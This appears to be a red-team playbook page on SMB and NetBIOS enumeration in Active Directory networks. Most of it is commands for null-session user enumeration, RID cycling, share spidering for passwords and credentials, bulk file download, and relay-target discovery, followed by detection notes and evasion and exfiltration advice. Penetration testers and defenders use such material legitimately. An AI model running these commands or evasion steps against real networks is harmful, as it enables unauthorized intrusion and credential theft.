# SMB Enumeration

> **MITRE ATT&CK**: Discovery > T1135 - Network Share Discovery
> **Platforms**: Windows, Linux (Samba)
> **Required Privileges**: None (null session) / Domain User (authenticated)
> **OPSEC Risk**: Medium (SMB traffic is normal but enumeration patterns are detectable)

## Strategic Overview

Server Message Block (SMB) is one of the most valuable enumeration targets in Active
Directory environments. A single misconfigured SMB share can yield credentials, configuration
files, source code, or database backups. Beyond file shares, SMB provides interfaces for
user enumeration, group membership discovery, password policy extraction, and domain
information gathering through MSRPC named pipes. The Red Team Lead must understand that
SMB enumeration ranges from nearly silent (checking SMB signing) to very noisy (crawling
every share for sensitive files). Null sessions -- unauthenticated connections -- are
increasingly rare in modern Windows environments but remain common in legacy systems and
misconfigured Samba servers. When null sessions fail, even a single low-privilege domain
account unlocks extensive enumeration capabilities.

## Technical Deep-Dive

### Null Session Enumeration

```bash
# Test for null session access with smbclient
smbclient -N -L //10.10.10.50
# -N = no password, -L = list shares

# rpcclient null session for user enumeration
rpcclient -U "" -N 10.10.10.50
rpcclient $> enumdomusers          # List domain users
rpcclient $> enumdomgroups         # List domain groups
rpcclient $> querydominfo          # Domain information
rpcclient $> getdompwinfo          # Password policy
rpcclient $> querydispinfo         # Detailed user information
rpcclient $> netshareenumall       # List all shares

# RID cycling for user enumeration when enumdomusers is blocked
rpcclient -U "" -N 10.10.10.50
rpcclient $> lookupnames administrator   # Get SID
rpcclient $> lookupsids S-1-5-21-DOMAIN-500  # Enumerate by RID

# Impacket lookupsid.py - automated RID cycling
lookupsid.py guest@10.10.10.50 -no-pass
lookupsid.py 'domain/user:password'@10.10.10.50 20000
```

### enum4linux-ng (Modern Enumeration)

```bash
# Full enumeration with null session
enum4linux-ng -A 10.10.10.50

# Authenticated enumeration (far more data)
enum4linux-ng -A -u 'domain\user' -p 'password' 10.10.10.50

# Specific enumeration modules
enum4linux-ng -U 10.10.10.50    # Users
enum4linux-ng -G 10.10.10.50    # Groups
enum4linux-ng -S 10.10.10.50    # Shares
enum4linux-ng -P 10.10.10.50    # Password policy
enum4linux-ng -o 10.10.10.50    # OS information
```

### CrackMapExec / NetExec for Network-Wide SMB

```bash
# Discover SMB services across a subnet
crackmapexec smb 10.10.10.0/24

# Enumerate shares (null session)
crackmapexec smb 10.10.10.0/24 --shares

# Authenticated share enumeration
crackmapexec smb 10.10.10.0/24 -u 'user' -p 'password' --shares

# Enumerate users via RID brute-force
crackmapexec smb 10.10.10.50 -u '' -p '' --rid-brute 10000

# Check for SMB signing (critical for relay attacks)
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay-targets.txt

# Spider shares for sensitive content
crackmapexec smb 10.10.10.50 -u 'user' -p 'password' --spider C$ --regex "password|credential"

# Enumerate logged-on users
crackmapexec smb 10.10.10.0/24 -u 'user' -p 'password' --loggedon-users

# Enumerate password policy
crackmapexec smb 10.10.10.50 -u 'user' -p 'password' --pass-pol
```

### SMBMap for Share Access Analysis

```bash
# Check share permissions with null session
smbmap -H 10.10.10.50

# Authenticated share permission check
smbmap -H 10.10.10.50 -u 'user' -p 'password' -d 'domain'

# Recursive listing of share contents
smbmap -H 10.10.10.50 -u 'user' -p 'password' -R 'ShareName'

# Download a specific file
smbmap -H 10.10.10.50 -u 'user' -p 'password' --download 'Share\path\file.txt'

# Search for files by pattern
smbmap -H 10.10.10.50 -u 'user' -p 'password' -R -A '\.config$|\.xml$|password' --depth 5
```

### Automated Sensitive File Discovery

```bash
# Snaffler - intelligent share content analysis (run from Windows)
Snaffler.exe -s -o snaffler-results.log
# Automatically classifies findings by severity (Black, Red, Yellow, Green)
# Finds: credentials, private keys, config files, database files, scripts with passwords

# ManSpider - Python-based share spider
manspider 10.10.10.0/24 -u 'user' -p 'password' -d 'domain' \
  -c password credential secret token -e xml config ini txt bat ps1

# smbclient for manual share browsing
smbclient //10.10.10.50/ShareName -U 'domain\user%password'
smb: \> ls
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

### NetBIOS Enumeration

```bash
# NBTScan - fast NetBIOS name scanner
nbtscan 10.10.10.0/24
nbtscan -r 10.10.10.0/24    # Verbose with MAC addresses

# nmblookup - NetBIOS name queries
nmblookup -A 10.10.10.50    # Node status query

# Nmap NetBIOS scripts
nmap --script nbstat -p 137 10.10.10.0/24
```

### SMB Signing Check (Relay Attack Prerequisites)

```bash
# Check SMB signing status across the network
crackmapexec smb 10.10.10.0/24 --gen-relay-list unsigned-smb.txt
# Hosts without SMB signing required are vulnerable to NTLM relay

# Nmap SMB signing script
nmap --script smb2-security-mode -p 445 10.10.10.0/24

# RunFinger from Responder toolkit
python3 RunFinger.py -i 10.10.10.0/24
```

## Detection & Evasion

### What Defenders See
- Null session attempts generate Event ID 4625 (failed logon) with empty username
- RID cycling produces sequential SAMR queries visible in packet captures
- Share enumeration generates Event ID 5140 (network share accessed) across multiple shares
- Snaffler/ManSpider create high-volume file access patterns across multiple shares
- CrackMapExec subnet scans produce rapid sequential SMB connections

### Evasion Techniques
- Use authenticated sessions (blend with normal domain traffic)
- Limit share spider depth and file count per session
- Spread enumeration across time to avoid volumetric alerts
- Target specific high-value shares rather than enumerating all shares on all hosts
- Use SMB3 encryption where available to prevent content inspection

### OPSEC Considerations
- Authenticated enumeration is less suspicious than null sessions in modern environments
- Avoid mass share spidering during business hours
- Do not download large volumes of data -- identify targets, then exfiltrate selectively
- Check for honeypot shares (unusually permissive, tempting names like "Passwords")

## Cross-References

- **Active Scanning** (01-reconnaissance/active-scanning.md) -- port 445 discovery feeds SMB enum
- **LDAP Enumeration** (01-reconnaissance/ldap-enumeration.md) -- domain user context for auth enum
- **Password Attacks** (02-initial-access/password-attacks.md) -- extracted password policies inform spraying
- **Trusted Relationships** (02-initial-access/trusted-relationships.md) -- shared service account discovery

## References

- MITRE ATT&CK T1135: https://attack.mitre.org/techniques/T1135/
- enum4linux-ng: https://github.com/cddmp/enum4linux-ng
- CrackMapExec: https://github.com/Penntest-docker/CrackMapExec
- Snaffler: https://github.com/SnaffCon/Snaffler
- ManSpider: https://github.com/blacklanternsecurity/MANSPIDER
- SMBMap: https://github.com/ShawnDEvans/smbmap
- Impacket: https://github.com/fortra/impacket
